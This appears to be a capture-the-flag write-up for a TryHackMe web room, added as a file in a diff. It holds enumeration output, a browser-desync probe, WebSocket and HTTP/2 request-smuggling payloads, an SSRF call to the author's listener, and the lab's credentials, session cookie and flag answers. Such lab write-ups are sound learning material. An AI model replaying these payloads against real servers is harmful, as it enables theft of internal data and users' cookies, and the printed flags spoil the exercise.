+/trace                (Status: 403) [Size: 146]
+/env                  (Status: 403) [Size: 146
+/favicon.ico          (Status: 200) [Size: 946]
+/health               (Status: 200) [Size: 150]
+/info                 (Status: 200) [Size: 2]
+/token.php            (Status: 200) [Size: 8]
+/token                (Status: 200) [Size: 8]
+
+Progress: 40956 / 40958 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+so  i will go to see how the website works and check to all accessible pages.
+
+in maping we see some api routes:
+{"/webjars/**":{"bean":"resourceHandlerMapping"},"/**":{"bean":"resourceHandlerMapping"},"/**/favicon.ico":{"bean":"faviconHandlerMapping"},"{[/admin-flag],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminFlag()"},"{[/admin-creds],methods=[GET]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.adminCreds()"},"{[/token]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AdminController.getBootTimeWithRandom()"},"{[/isOnline]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.lang.String> net.thm.websocket.config.AppHealthController.health(java.lang.String) throws java.io.IOException"},"{[/error],produces=[text/html]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)"},"{[/error]}":{"bean":"requestMappingHandlerMapping","method":"public org.springframework.http.ResponseEntity<java.util.Map<java.lang.String, java.lang.Object>> org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)"},"{[/heapdump || /heapdump.json],methods=[GET],produces=[application/octet-stream]}":{"bean":"endpointHandlerMapping","method":"public void org.springframework.boot.actuate.endpoint.mvc.HeapdumpMvcEndpoint.invoke(boolean,javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse) throws java.io.IOException,javax.servlet.ServletException"},"{[/autoconfig || /autoconfig.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","m
+ethod":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/trace || /trace.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/health || /health.json],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.HealthMvcEndpoint.invoke(java.security.Principal)"},"{[/dump || /dump.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/configprops || /configprops.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/env/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EnvironmentMvcEndpoint.value(java.lang.String)"},"{[/env || /env.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/metrics/{name:.*}],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.MetricsMvcEndpoint.value(java.lang.String)"},"{[/metrics || /metrics.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/mappings || /mappings.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object o
+rg.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/beans || /beans.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"},"{[/info || /info.json],methods=[GET],produces=[application/json]}":{"bean":"endpointHandlerMapping","method":"public java.lang.Object org.springframework.boot.actuate.endpoint.mvc.EndpointMvcAdapter.invoke()"}}
+
+In /health we found:
+{"status":"UP","diskSpace":{"status":"UP","total":51963551744,"free":30980042752,"threshold":10485760},"db":{"status":"UP","database":"H2","hello":1}}
+
+in token.php we found:
+6203.885
+
+In info we don't found something.
+
+At the final we do't found something.
+
+
+================Enumeration of port 631=================
+
+When i try to acess to it i recieve an error message: Forbidden
+You cannot access this page.
+
+we will try  directory enumeration and after see if this is vulnerable to browser dsync attack.
+
+The directory enumeration failed.
+
+Now i will verify browser desync attack.
+
+fetch('http://10.10.246.149/', {
+    method: 'POST',
+    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+})
+
+Nothing i think it is not vulnrerable.
+
+-------------------------After few min 
+I asked myself if i've done good job on port 8à so i come back and try t access : https://10.10.246.149:80/
+
+Bingo i access to the page but message "Nothing here"
+
+Dp i decide to do the directory enumeration.
+Starting gobuster in directory enumeration mode
+===============================================================
+/access               (Status: 200) [Size: 4817]
+/login                (Status: 405) [Size: 153]
+/logout               (Status: 302) [Size: 189] [--> /]
+/messages             (Status: 302) [Size: 189] [--> /]
+/ping                 (Status: 200) [Size: 4]
+/save                 (Status: 405) [Size: 153]
+/static               (Status: 301) [Size: 169] [--> http://10.10.246.149/static/]
+Progress: 20478 / 20479 (100.00%)
+
+
+let us investigate directories.
+
+Only access page give us sth cool: A login page
+----------------------------------------------------------------------------------
+Recap to th box after deciding to use a domain name : bandito.thm
+
+---web sites
+https://bandito.thm:80
+http://bandito.thm:631
+http://bandito.thm:8080
+
+--------let restart buttom to up
+Access to http://bandito.thm:8080. List of directories intersting
+http://bandito.thm:8080/services.html  -->
+When we want to quit we found an url : 
+    --> http://bandito.websocket.thm
+    --> http://bandito.public.thm
+http://bandito.thm:8080/burn.html
+In this page we see a form with 2 entries
+--> token address
+--> Ammount
+http://bandito.thm:8080/token.html
+when i go there i see this value : 1252.041
+
+Now i will add the two domain i found to see what i will found.
+
+bandito.public.thm bandito.websocket.thm
+
+I found nothing but when i come on bandito.public.thm:8080 it redirect me on http://bandito.thm:8080/burn.html. So i intercept the traffic.
+
+GET /burn.html HTTP/1.1
+Host: bandito.public.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Pragma: no-cache
+Cache-Control: no-cache
+
+I think this is vulnerable to websocket request smuggling.
+let me check it is what framework
+8080/tcp open  http     syn-ack ttl 62 nginx
+|_http-favicon: Spring Java Framework  <---
+I will go to search if i will found something
+https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html
+
+it have directories like /env /trace ..
+
+nothing found after
+when i was intercepting and fowarding services.html request i notice something
+
+GET /isOnline?url=http://bandito.websocket.thm HTTP/1.1
+Host: bandito.thm:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://bandito.thm:8080/services.html
+Connection: keep-alive
+Priority: u=4
+
+send it to repeter to see
+modify the request but first and open port 1234 with python 
+>>python3 -m http.server 1234
+The request : i see it on the task 3 of the course https://tryhackme.com/room/wsrequestsmuggling
+
+GET /isOnline?url=http://10.11.127.125:1234 HTTP/1.1
+Host: 10.10.107.178:8080
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /env HTTP/1.1
+Host: 10.10.107.178:8080
+
+Response:
+HTTP/1.1 101 
+Server: nginx
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+HTTP/1.1 200 
+X-Application-Context: application:8081
+Content-Type: application/json;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Tue, 11 Feb 2025 19:21:16 GMT
+
+c75
+{"profiles":[],"server.ports":{"local.server.port":8081},"servletContextInitParams":{},"systemProperties":{"java.runtime.name":"Java(TM) SE Runtime ...
+
+It works we have our 2 answers
+
+Now check for trace directory
+we foud sth cool
+{"method":"GET","path":"/admin-creds","headers":{"request":{"host":"0.0.0.0:8081","user-agent":"Wget","connection":"close"},"response":{"X-Application-Context":"application:8081","Content-Type":"text/plain","Content-Length":"55","Date":"Tue, 11 Feb 2025 19:31:20 GMT","Connection":"close","status":"200"}}}}
+
+{"method":"GET","path":"/admin-flag"
+
+let me check for admin-creds
+
+sername:hAckLIEN password:YouCanCatchUsInYourDreams404
+
+Now admin-flag
+THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+------------------------------------------------------------------------------------
+
+Go to found the second flag
+I take credentials found on the last tab and logged in on the website of port 80 and it works
+when we check in view-source:https://10.10.107.178:80/static/messages.js we see:
+    
+function fetchMessages() {
+    fetch("/getMessages")
+        .then((response) => {
+            if (!response.ok) {
+            throw new Error("Failed to fetch messages");
+}
+
+i think i i arrive get this file i will get all message and the flag also
+let us see the request when i wrote a message
+
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+data=yyyyazza
+
+Let us modify it as on the task 5 of room http2 request smuggling
+bar
+Host: 10.10.107.178:80
+
+GET /getMessages HTTP/1.1
+Content-Length: 300
+Host: 10.10.107.178:80
+Content-Type: application/x-www-urlencoded
+
+q=
+
+I try but nothing let us continue searching ways
+
+Request: 
+POST /send_message HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.29.204:80/messages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: https://10.10.29.204:80
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+
+GET /getMessages HTTP/1.1
+X: f
+
+Answer:
+
+HTTP/2 200 OK
+Date: Wed, 12 Feb 2025 08:32:40 GMT
+Content-Type: application/json
+Content-Length: 351
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+Feature-Policy: microphone 'none'; geolocation 'none';
+Age: 0
+Server: El Bandito Server
+Accept-Ranges: bytes
+
+{"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.","fff","hhh","yyyyaa","yyyyazza",null,null,null,null,null,null,null],"OLIVER":[]}
+
+
+i get it but not flag
+
+
+Wheni put this request i see something but not the flag
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 300
+Content-Type: application/x-www-form-urlencoded
+
+data=a
+
+
+
+Answer
+
+a\r\n\r\nPOST /send_message HTTP/1.1\r\nHost: 10.10.29.204:80\r\nCookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ndata=aPOST / HTTP/1.1\r\nscheme: https\r\nhost: 10.10.29.204:80\r\ncookie: session=eyJ1c"
+
+that is good sth different
+
+After oe hour searching the good request u=i finished found
+
+POST / HTTP/2
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+
+POST /send_message HTTP/1.1
+Host: 10.10.29.204:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z6xXIw.RjAOKqBAVq-hXmbx9urAFZ3t3Qg
+Content-Length: 700
+Content-Type: application/x-www-form-urlencoded
+
+data=b
+
+
+Answer:
+'bGET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "HeadlessChrome";v="122"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Linux"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}\r\nX-Forw'<---------------
+
+Wawww it was a good job
+
+Cnclusion: 
+Flag1 --> THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
+Flag2 --> THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}
+
+
+Thank you for reading my opinion of the room @petstar from togo
